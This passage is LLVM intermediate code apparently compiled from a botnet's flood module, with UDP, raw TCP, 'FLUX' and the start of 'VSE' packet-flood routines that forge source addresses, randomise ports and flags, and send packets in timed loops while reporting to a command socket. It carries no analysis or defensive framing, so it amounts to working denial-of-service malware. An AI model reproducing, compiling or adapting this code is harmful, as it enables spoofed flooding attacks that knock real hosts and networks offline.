  %.sink = phi i16 [ %18, %16 ], [ %15, %13 ]
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 1
  store i16 %.sink, i16* %20, align 2
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 2
  %22 = call i32 @getHost(i8* %0, %struct.in_addr* %21)
  %23 = icmp eq i32 %22, 0
  br i1 %23, label %24, label %.loopexit

; <label>:24:                                     ; preds = %19
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 3, i64 0
  %26 = bitcast i8* %25 to i64*
  store i64 0, i64* %26, align 4
  %27 = icmp eq i32 %3, 32
  br i1 %27, label %28, label %62

; <label>:28:                                     ; preds = %24
  %29 = tail call i32 @socket(i32 2, i32 2, i32 17) #3
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %34

; <label>:31:                                     ; preds = %28
  %32 = load i32, i32* @mainCommSock, align 4
  %33 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %32, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.87, i64 0, i64 0))
  br label %.loopexit

; <label>:34:                                     ; preds = %28
  %35 = add nsw i32 %4, 1
  %36 = sext i32 %35 to i64
  %37 = tail call noalias i8* @malloc(i64 %36) #3
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit, label %39

; <label>:39:                                     ; preds = %34
  tail call void @llvm.memset.p0i8.i64(i8* nonnull %37, i8 0, i64 %36, i32 1, i1 false)
  tail call void @RandString(i8* nonnull %37, i32 %4)
  %40 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %41 = add nsw i32 %40, %2
  %42 = sext i32 %4 to i64
  %43 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %44 = mul nsw i32 %7, 1000
  br label %.outer

.outer:                                           ; preds = %.outer.backedge, %39
  %.068.ph = phi i32 [ 0, %39 ], [ %.068.ph.be, %.outer.backedge ]
  %.067.ph = phi i32 [ 0, %39 ], [ %56, %.outer.backedge ]
  br label %45

; <label>:45:                                     ; preds = %.outer, %52
  %.067 = phi i32 [ 0, %52 ], [ %.067.ph, %.outer ]
  %46 = call i64 @sendto(i32 %29, i8* nonnull %37, i64 %42, i32 0, %struct.sockaddr* nonnull %43, i32 16) #3
  %47 = icmp eq i32 %.067, %5
  br i1 %47, label %48, label %55

; <label>:48:                                     ; preds = %45
  br i1 %12, label %49, label %52

; <label>:49:                                     ; preds = %48
  %50 = call i32 @rand_cmwc()
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %20, align 2
  br label %52

; <label>:52:                                     ; preds = %49, %48
  %53 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %54 = icmp sgt i32 %53, %41
  br i1 %54, label %.loopexit.loopexit, label %45

; <label>:55:                                     ; preds = %45
  %56 = add i32 %.067, 1
  %57 = icmp eq i32 %.068.ph, %6
  br i1 %57, label %58, label %60

; <label>:58:                                     ; preds = %55
  %59 = call i32 @usleep(i32 %44) #3
  br label %.outer.backedge

.outer.backedge:                                  ; preds = %58, %60
  %.068.ph.be = phi i32 [ %61, %60 ], [ 0, %58 ]
  br label %.outer

; <label>:60:                                     ; preds = %55
  %61 = add i32 %.068.ph, 1
  br label %.outer.backedge

; <label>:62:                                     ; preds = %24
  %63 = tail call i32 @socket(i32 2, i32 3, i32 17) #3
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %65, label %68

; <label>:65:                                     ; preds = %62
  %66 = load i32, i32* @mainCommSock, align 4
  %67 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %66, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.87, i64 0, i64 0))
  br label %.loopexit

; <label>:68:                                     ; preds = %62
  store i32 1, i32* %10, align 4
  %69 = bitcast i32* %10 to i8*
  %70 = call i32 @setsockopt(i32 %63, i32 0, i32 3, i8* nonnull %69, i32 4) #3
  %71 = icmp slt i32 %70, 0
  br i1 %71, label %72, label %.preheader.preheader

.preheader.preheader:                             ; preds = %68
  br label %.preheader

; <label>:72:                                     ; preds = %68
  %73 = load i32, i32* @mainCommSock, align 4
  %74 = call i32 (i32, i8*, ...) @sockprintf(i32 %73, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.88, i64 0, i64 0))
  br label %.loopexit

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.06974 = phi i32 [ %75, %.preheader ], [ 50, %.preheader.preheader ]
  %75 = add nsw i32 %.06974, -1
  %76 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %77 = call i32 @rand_cmwc()
  %78 = xor i32 %77, %76
  call void @srand(i32 %78) #3
  %79 = call i32 @rand() #3
  call void @init_rand(i32 %79)
  %80 = icmp eq i32 %75, 0
  br i1 %80, label %81, label %.preheader

; <label>:81:                                     ; preds = %.preheader
  %82 = icmp eq i32 %3, 0
  %83 = sub nsw i32 32, %3
  %84 = shl i32 -1, %83
  %.070 = select i1 %82, i32 0, i32 %84
  %85 = sext i32 %4 to i64
  %86 = add nsw i64 %85, 28
  %87 = call i8* @llvm.stacksave()
  %88 = alloca i8, i64 %86, align 16
  %89 = bitcast i8* %88 to %struct.iphdr*
  %90 = getelementptr i8, i8* %88, i64 20
  %91 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %21, i64 0, i32 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @GetRandomIP(i32 %.070)
  %94 = call i32 @htonl(i32 %93) #17
  %95 = add nsw i64 %85, 8
  %96 = trunc i64 %95 to i32
  call void @makeIPPacket(%struct.iphdr* nonnull %89, i32 %92, i32 %94, i8 zeroext 17, i32 %96)
  %97 = trunc i64 %95 to i16
  %98 = call zeroext i16 @htons(i16 zeroext %97) #17
  %99 = getelementptr inbounds i8, i8* %88, i64 24
  %100 = bitcast i8* %99 to i16*
  store i16 %98, i16* %100, align 8
  %101 = call i32 @rand_cmwc()
  %102 = trunc i32 %101 to i16
  %103 = bitcast i8* %90 to i16*
  store i16 %102, i16* %103, align 4
  br i1 %12, label %104, label %106

; <label>:104:                                    ; preds = %81
  %105 = call i32 @rand_cmwc()
  br label %110

; <label>:106:                                    ; preds = %81
  %107 = trunc i32 %1 to i16
  %108 = call zeroext i16 @htons(i16 zeroext %107) #17
  %109 = zext i16 %108 to i32
  br label %110

; <label>:110:                                    ; preds = %106, %104
  %111 = phi i32 [ %105, %104 ], [ %109, %106 ]
  %112 = trunc i32 %111 to i16
  %113 = getelementptr inbounds i8, i8* %88, i64 22
  %114 = bitcast i8* %113 to i16*
  store i16 %112, i16* %114, align 2
  %115 = getelementptr inbounds i8, i8* %88, i64 26
  %116 = bitcast i8* %115 to i16*
  store i16 0, i16* %116, align 2
  %117 = getelementptr inbounds i8, i8* %88, i64 28
  call void @RandString(i8* %117, i32 %4)
  %118 = bitcast i8* %88 to i16*
  %119 = getelementptr inbounds i8, i8* %88, i64 2
  %120 = bitcast i8* %119 to i16*
  %121 = load i16, i16* %120, align 2
  %122 = zext i16 %121 to i32
  %123 = call zeroext i16 @csum(i16* nonnull %118, i32 %122)
  %124 = getelementptr inbounds i8, i8* %88, i64 10
  %125 = bitcast i8* %124 to i16*
  store i16 %123, i16* %125, align 2
  %126 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %127 = add nsw i32 %126, %2
  %128 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %129 = getelementptr inbounds i8, i8* %88, i64 4
  %130 = bitcast i8* %129 to i16*
  %131 = getelementptr inbounds i8, i8* %88, i64 12
  %132 = bitcast i8* %131 to i32*
  %133 = trunc i32 %1 to i16
  %134 = mul nsw i32 %7, 1000
  br label %.outer71

.outer71:                                         ; preds = %.outer71.backedge, %110
  %.066.ph = phi i32 [ 0, %110 ], [ %159, %.outer71.backedge ]
  %.0.ph = phi i32 [ 0, %110 ], [ %.0.ph.be, %.outer71.backedge ]
  br label %135

; <label>:135:                                    ; preds = %.outer71, %155
  %.066 = phi i32 [ 0, %155 ], [ %.066.ph, %.outer71 ]
  %136 = call i64 @sendto(i32 %63, i8* nonnull %88, i64 %86, i32 0, %struct.sockaddr* nonnull %128, i32 16) #3
  %137 = call i32 @rand_cmwc()
  %138 = trunc i32 %137 to i16
  store i16 %138, i16* %103, align 4
  br i1 %12, label %139, label %141

; <label>:139:                                    ; preds = %135
  %140 = call i32 @rand_cmwc()
  br label %144

; <label>:141:                                    ; preds = %135
  %142 = call zeroext i16 @htons(i16 zeroext %133) #17
  %143 = zext i16 %142 to i32
  br label %144

; <label>:144:                                    ; preds = %141, %139
  %145 = phi i32 [ %140, %139 ], [ %143, %141 ]
  %146 = trunc i32 %145 to i16
  store i16 %146, i16* %114, align 2
  %147 = call i32 @rand_cmwc()
  %148 = trunc i32 %147 to i16
  store i16 %148, i16* %130, align 4
  %149 = call i32 @GetRandomIP(i32 %.070)
  %150 = call i32 @htonl(i32 %149) #17
  store i32 %150, i32* %132, align 4
  %151 = load i16, i16* %120, align 2
  %152 = zext i16 %151 to i32
  %153 = call zeroext i16 @csum(i16* nonnull %118, i32 %152)
  store i16 %153, i16* %125, align 2
  %154 = icmp eq i32 %.066, %5
  br i1 %154, label %155, label %158

; <label>:155:                                    ; preds = %144
  %156 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %157 = icmp sgt i32 %156, %127
  br i1 %157, label %165, label %135

; <label>:158:                                    ; preds = %144
  %159 = add i32 %.066, 1
  %160 = icmp eq i32 %.0.ph, %6
  br i1 %160, label %161, label %163

; <label>:161:                                    ; preds = %158
  %162 = call i32 @usleep(i32 %134) #3
  br label %.outer71.backedge

.outer71.backedge:                                ; preds = %161, %163
  %.0.ph.be = phi i32 [ 0, %161 ], [ %164, %163 ]
  br label %.outer71

; <label>:163:                                    ; preds = %158
  %164 = add i32 %.0.ph, 1
  br label %.outer71.backedge

; <label>:165:                                    ; preds = %155
  call void @llvm.stackrestore(i8* %87)
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %52
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %19, %34, %165, %72, %65, %31
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #4

declare i32 @usleep(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @srand(i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #9

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 0
  store i16 2, i16* %10, align 4
  %11 = icmp eq i32 %1, 0
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @rand_cmwc()
  %14 = trunc i32 %13 to i16
  br label %18

; <label>:15:                                     ; preds = %7
  %16 = trunc i32 %1 to i16
  %17 = tail call zeroext i16 @htons(i16 zeroext %16) #17
  br label %18

; <label>:18:                                     ; preds = %15, %12
  %.sink = phi i16 [ %17, %15 ], [ %14, %12 ]
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 1
  store i16 %.sink, i16* %19, align 2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2
  %21 = call i32 @getHost(i8* %0, %struct.in_addr* %20)
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %23, label %164

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 3, i64 0
  %25 = bitcast i8* %24 to i64*
  store i64 0, i64* %25, align 4
  %26 = tail call i32 @socket(i32 2, i32 3, i32 6) #3
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %31

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* @mainCommSock, align 4
  %30 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %29, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.87, i64 0, i64 0))
  br label %164

; <label>:31:                                     ; preds = %23
  store i32 1, i32* %9, align 4
  %32 = bitcast i32* %9 to i8*
  %33 = call i32 @setsockopt(i32 %26, i32 0, i32 3, i8* nonnull %32, i32 4) #3
  %34 = icmp slt i32 %33, 0
  br i1 %34, label %35, label %38

; <label>:35:                                     ; preds = %31
  %36 = load i32, i32* @mainCommSock, align 4
  %37 = call i32 (i32, i8*, ...) @sockprintf(i32 %36, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.88, i64 0, i64 0))
  br label %164

; <label>:38:                                     ; preds = %31
  %39 = icmp eq i32 %3, 0
  %40 = sub nsw i32 32, %3
  %41 = shl i32 -1, %40
  %.065 = select i1 %39, i32 0, i32 %41
  %42 = sext i32 %5 to i64
  %43 = add nsw i64 %42, 40
  %44 = call i8* @llvm.stacksave()
  %45 = alloca i8, i64 %43, align 16
  %46 = bitcast i8* %45 to %struct.iphdr*
  %47 = getelementptr i8, i8* %45, i64 20
  %48 = bitcast i8* %47 to %struct.tcphdr*
  %49 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i64 0, i32 0
  %50 = load i32, i32* %49, align 4
  %51 = call i32 @GetRandomIP(i32 %.065)
  %52 = call i32 @htonl(i32 %51) #17
  %53 = add i32 %5, 20
  call void @makeIPPacket(%struct.iphdr* nonnull %46, i32 %50, i32 %52, i8 zeroext 6, i32 %53)
  %54 = call i32 @rand_cmwc()
  %55 = trunc i32 %54 to i16
  %56 = bitcast i8* %47 to i16*
  store i16 %55, i16* %56, align 4
  %57 = call i32 @rand_cmwc()
  %58 = getelementptr inbounds i8, i8* %45, i64 24
  %59 = bitcast i8* %58 to i32*
  store i32 %57, i32* %59, align 8
  %60 = getelementptr inbounds i8, i8* %45, i64 28
  %61 = bitcast i8* %60 to i32*
  store i32 0, i32* %61, align 4
  %62 = getelementptr inbounds i8, i8* %45, i64 32
  %63 = bitcast i8* %62 to i16*
  %64 = load i16, i16* %63, align 16
  %65 = and i16 %64, -241
  %66 = or i16 %65, 80
  store i16 %66, i16* %63, align 16
  %67 = call i32 @strcmp(i8* %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.89, i64 0, i64 0)) #14
  %68 = icmp eq i32 %67, 0
  br i1 %68, label %69, label %72

; <label>:69:                                     ; preds = %38
  %70 = and i16 %64, -8177
  %71 = or i16 %70, 8016
  store i16 %71, i16* %63, align 16
  br label %.loopexit

; <label>:72:                                     ; preds = %38
  %73 = call i8* @strtok(i8* %4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.90, i64 0, i64 0)) #3
  %74 = icmp eq i8* %73, null
  br i1 %74, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %72
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %107
  %.06667 = phi i8* [ %108, %107 ], [ %73, %.lr.ph.preheader ]
  %75 = call i32 @strcmp(i8* nonnull %.06667, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.91, i64 0, i64 0)) #14
  %76 = icmp eq i32 %75, 0
  br i1 %76, label %77, label %80

; <label>:77:                                     ; preds = %.lr.ph
  %78 = load i16, i16* %63, align 16
  %79 = or i16 %78, 512
  store i16 %79, i16* %63, align 16
  br label %107

; <label>:80:                                     ; preds = %.lr.ph
  %81 = call i32 @strcmp(i8* nonnull %.06667, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.92, i64 0, i64 0)) #14
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %83, label %86

; <label>:83:                                     ; preds = %80
  %84 = load i16, i16* %63, align 16
  %85 = or i16 %84, 1024
  store i16 %85, i16* %63, align 16
  br label %107

; <label>:86:                                     ; preds = %80
  %87 = call i32 @strcmp(i8* nonnull %.06667, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.93, i64 0, i64 0)) #14
  %88 = icmp eq i32 %87, 0
  br i1 %88, label %89, label %92

; <label>:89:                                     ; preds = %86
  %90 = load i16, i16* %63, align 16
  %91 = or i16 %90, 256
  store i16 %91, i16* %63, align 16
  br label %107

; <label>:92:                                     ; preds = %86
  %93 = call i32 @strcmp(i8* nonnull %.06667, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.94, i64 0, i64 0)) #14
  %94 = icmp eq i32 %93, 0
  br i1 %94, label %95, label %98

; <label>:95:                                     ; preds = %92
  %96 = load i16, i16* %63, align 16
  %97 = or i16 %96, 4096
  store i16 %97, i16* %63, align 16
  br label %107

; <label>:98:                                     ; preds = %92
  %99 = call i32 @strcmp(i8* nonnull %.06667, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.95, i64 0, i64 0)) #14
  %100 = icmp eq i32 %99, 0
  br i1 %100, label %101, label %104

; <label>:101:                                    ; preds = %98
  %102 = load i16, i16* %63, align 16
  %103 = or i16 %102, 2048
  store i16 %103, i16* %63, align 16
  br label %107

; <label>:104:                                    ; preds = %98
  %105 = load i32, i32* @mainCommSock, align 4
  %106 = call i32 (i32, i8*, ...) @sockprintf(i32 %105, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.96, i64 0, i64 0), i8* nonnull %.06667)
  br label %107

; <label>:107:                                    ; preds = %83, %95, %104, %101, %89, %77
  %108 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i64 0, i64 0)) #3
  %109 = icmp eq i8* %108, null
  br i1 %109, label %.loopexit.loopexit, label %.lr.ph

.loopexit.loopexit:                               ; preds = %107
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %72, %69
  %110 = call i32 @rand_cmwc()
  %111 = trunc i32 %110 to i16
  %112 = getelementptr inbounds i8, i8* %45, i64 34
  %113 = bitcast i8* %112 to i16*
  store i16 %111, i16* %113, align 2
  %114 = getelementptr inbounds i8, i8* %45, i64 36
  %115 = bitcast i8* %114 to i16*
  store i16 0, i16* %115, align 4
  %116 = getelementptr inbounds i8, i8* %45, i64 38
  %117 = bitcast i8* %116 to i16*
  store i16 0, i16* %117, align 2
  br i1 %11, label %118, label %120

; <label>:118:                                    ; preds = %.loopexit
  %119 = call i32 @rand_cmwc()
  br label %124

; <label>:120:                                    ; preds = %.loopexit
  %121 = trunc i32 %1 to i16
  %122 = call zeroext i16 @htons(i16 zeroext %121) #17
  %123 = zext i16 %122 to i32
  br label %124

; <label>:124:                                    ; preds = %120, %118
  %125 = phi i32 [ %119, %118 ], [ %123, %120 ]
  %126 = trunc i32 %125 to i16
  %127 = getelementptr inbounds i8, i8* %45, i64 22
  %128 = bitcast i8* %127 to i16*
  store i16 %126, i16* %128, align 2
  %129 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %129, i16* %115, align 4
  %130 = bitcast i8* %45 to i16*
  %131 = getelementptr inbounds i8, i8* %45, i64 2
  %132 = bitcast i8* %131 to i16*
  %133 = load i16, i16* %132, align 2
  %134 = zext i16 %133 to i32
  %135 = call zeroext i16 @csum(i16* nonnull %130, i32 %134)
  %136 = getelementptr inbounds i8, i8* %45, i64 10
  %137 = bitcast i8* %136 to i16*
  store i16 %135, i16* %137, align 2
  %138 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %139 = add nsw i32 %138, %2
  %140 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %141 = getelementptr inbounds i8, i8* %45, i64 12
  %142 = bitcast i8* %141 to i32*
  %143 = getelementptr inbounds i8, i8* %45, i64 4
  %144 = bitcast i8* %143 to i16*
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %124
  %.0 = phi i32 [ 0, %124 ], [ %.0.be, %.backedge.backedge ]
  %145 = call i64 @sendto(i32 %26, i8* nonnull %45, i64 %43, i32 0, %struct.sockaddr* nonnull %140, i32 16) #3
  %146 = call i32 @GetRandomIP(i32 %.065)
  %147 = call i32 @htonl(i32 %146) #17
  store i32 %147, i32* %142, align 4
  %148 = call i32 @rand_cmwc()
  %149 = trunc i32 %148 to i16
  store i16 %149, i16* %144, align 4
  %150 = call i32 @rand_cmwc()
  store i32 %150, i32* %59, align 8
  %151 = call i32 @rand_cmwc()
  %152 = trunc i32 %151 to i16
  store i16 %152, i16* %56, align 4
  store i16 0, i16* %115, align 4
  %153 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %153, i16* %115, align 4
  %154 = load i16, i16* %132, align 2
  %155 = zext i16 %154 to i32
  %156 = call zeroext i16 @csum(i16* nonnull %130, i32 %155)
  store i16 %156, i16* %137, align 2
  %157 = icmp eq i32 %.0, %6
  br i1 %157, label %158, label %161

; <label>:158:                                    ; preds = %.backedge
  %159 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %160 = icmp sgt i32 %159, %139
  br i1 %160, label %163, label %.backedge.backedge

; <label>:161:                                    ; preds = %.backedge
  %162 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %161, %158
  %.0.be = phi i32 [ %162, %161 ], [ 0, %158 ]
  br label %.backedge

; <label>:163:                                    ; preds = %158
  call void @llvm.stackrestore(i8* %44)
  br label %164

; <label>:164:                                    ; preds = %18, %163, %35, %28
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendFLUX(i8*, i32, i32, i32, i32, i32) local_unnamed_addr #1 {
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  store i16 2, i16* %9, align 4
  %10 = icmp eq i32 %1, 0
  br i1 %10, label %11, label %14

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @rand_cmwc()
  %13 = trunc i32 %12 to i16
  br label %17

; <label>:14:                                     ; preds = %6
  %15 = trunc i32 %1 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #17
  br label %17

; <label>:17:                                     ; preds = %14, %11
  %.sink = phi i16 [ %16, %14 ], [ %13, %11 ]
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  store i16 %.sink, i16* %18, align 2
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2
  %20 = call i32 @getHost(i8* %0, %struct.in_addr* %19)
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %22, label %114

; <label>:22:                                     ; preds = %17
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 3, i64 0
  %24 = bitcast i8* %23 to i64*
  store i64 0, i64* %24, align 4
  %25 = tail call i32 @socket(i32 2, i32 3, i32 6) #3
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %114, label %27

; <label>:27:                                     ; preds = %22
  store i32 1, i32* %8, align 4
  %28 = bitcast i32* %8 to i8*
  %29 = call i32 @setsockopt(i32 %25, i32 0, i32 3, i8* nonnull %28, i32 4) #3
  %30 = icmp slt i32 %29, 0
  br i1 %30, label %114, label %31

; <label>:31:                                     ; preds = %27
  %32 = icmp eq i32 %3, 0
  %33 = sub nsw i32 32, %3
  %34 = shl i32 -1, %33
  %.049 = select i1 %32, i32 0, i32 %34
  %35 = sext i32 %4 to i64
  %36 = add nsw i64 %35, 40
  %37 = call i8* @llvm.stacksave()
  %38 = alloca i8, i64 %36, align 16
  %39 = bitcast i8* %38 to %struct.iphdr*
  %40 = getelementptr i8, i8* %38, i64 20
  %41 = bitcast i8* %40 to %struct.tcphdr*
  %42 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %19, i64 0, i32 0
  %43 = load i32, i32* %42, align 4
  %44 = call i32 @GetRandomIP(i32 %.049)
  %45 = call i32 @htonl(i32 %44) #17
  %46 = add i32 %4, 20
  call void @makeIPPacket(%struct.iphdr* nonnull %39, i32 %43, i32 %45, i8 zeroext 6, i32 %46)
  %47 = call zeroext i16 @htons(i16 zeroext 5678) #17
  %48 = bitcast i8* %40 to i16*
  store i16 %47, i16* %48, align 4
  %49 = call i32 @rand() #3
  %50 = getelementptr inbounds i8, i8* %38, i64 24
  %51 = bitcast i8* %50 to i32*
  store i32 %49, i32* %51, align 8
  %52 = call i32 @rand_cmwc()
  %53 = getelementptr inbounds i8, i8* %38, i64 28
  %54 = bitcast i8* %53 to i32*
  store i32 %52, i32* %54, align 4
  %55 = getelementptr inbounds i8, i8* %38, i64 32
  %56 = bitcast i8* %55 to i16*
  %57 = load i16, i16* %56, align 16
  %58 = and i16 %57, 11535
  %59 = or i16 %58, 4688
  store i16 %59, i16* %56, align 16
  %60 = call i32 @rand_cmwc()
  %61 = trunc i32 %60 to i16
  %62 = getelementptr inbounds i8, i8* %38, i64 34
  %63 = bitcast i8* %62 to i16*
  store i16 %61, i16* %63, align 2
  %64 = getelementptr inbounds i8, i8* %38, i64 36
  %65 = bitcast i8* %64 to i16*
  store i16 0, i16* %65, align 4
  %66 = getelementptr inbounds i8, i8* %38, i64 38
  %67 = bitcast i8* %66 to i16*
  store i16 0, i16* %67, align 2
  br i1 %10, label %68, label %70

; <label>:68:                                     ; preds = %31
  %69 = call i32 @rand_cmwc()
  br label %74

; <label>:70:                                     ; preds = %31
  %71 = trunc i32 %1 to i16
  %72 = call zeroext i16 @htons(i16 zeroext %71) #17
  %73 = zext i16 %72 to i32
  br label %74

; <label>:74:                                     ; preds = %70, %68
  %75 = phi i32 [ %69, %68 ], [ %73, %70 ]
  %76 = trunc i32 %75 to i16
  %77 = getelementptr inbounds i8, i8* %38, i64 22
  %78 = bitcast i8* %77 to i16*
  store i16 %76, i16* %78, align 2
  %79 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %39, %struct.tcphdr* %41)
  store i16 %79, i16* %65, align 4
  %80 = bitcast i8* %38 to i16*
  %81 = getelementptr inbounds i8, i8* %38, i64 2
  %82 = bitcast i8* %81 to i16*
  %83 = load i16, i16* %82, align 2
  %84 = zext i16 %83 to i32
  %85 = call zeroext i16 @csum(i16* nonnull %80, i32 %84)
  %86 = getelementptr inbounds i8, i8* %38, i64 10
  %87 = bitcast i8* %86 to i16*
  store i16 %85, i16* %87, align 2
  %88 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %89 = add nsw i32 %88, %2
  %90 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %91 = getelementptr inbounds i8, i8* %38, i64 12
  %92 = bitcast i8* %91 to i32*
  %93 = getelementptr inbounds i8, i8* %38, i64 4
  %94 = bitcast i8* %93 to i16*
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %74
  %.0 = phi i32 [ 0, %74 ], [ %.0.be, %.backedge.backedge ]
  %95 = call i64 @sendto(i32 %25, i8* nonnull %38, i64 %36, i32 0, %struct.sockaddr* nonnull %90, i32 16) #3
  %96 = call i32 @GetRandomIP(i32 %.049)
  %97 = call i32 @htonl(i32 %96) #17
  store i32 %97, i32* %92, align 4
  %98 = call i32 @rand_cmwc()
  %99 = trunc i32 %98 to i16
  store i16 %99, i16* %94, align 4
  %100 = call i32 @rand_cmwc()
  store i32 %100, i32* %51, align 8
  %101 = call i32 @rand_cmwc()
  %102 = trunc i32 %101 to i16
  store i16 %102, i16* %48, align 4
  store i16 0, i16* %65, align 4
  %103 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %39, %struct.tcphdr* nonnull %41)
  store i16 %103, i16* %65, align 4
  %104 = load i16, i16* %82, align 2
  %105 = zext i16 %104 to i32
  %106 = call zeroext i16 @csum(i16* nonnull %80, i32 %105)
  store i16 %106, i16* %87, align 2
  %107 = icmp eq i32 %.0, %5
  br i1 %107, label %108, label %111

; <label>:108:                                    ; preds = %.backedge
  %109 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %110 = icmp sgt i32 %109, %89
  br i1 %110, label %113, label %.backedge.backedge

; <label>:111:                                    ; preds = %.backedge
  %112 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %111, %108
  %.0.be = phi i32 [ %112, %111 ], [ 0, %108 ]
  br label %.backedge

; <label>:113:                                    ; preds = %108
  call void @llvm.stackrestore(i8* %37)
  br label %114

; <label>:114:                                    ; preds = %22, %17, %27, %113
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendVSE(i8*, i32, i32, i32, i32, i32, i32, i32) local_unnamed_addr #1 {
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i32, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = icmp eq i32 %1, 0
  br i1 %12, label %13, label %16

; <label>:13:                                     ; preds = %8
  %14 = tail call i32 @rand_cmwc()
  %15 = trunc i32 %14 to i16
  br label %19

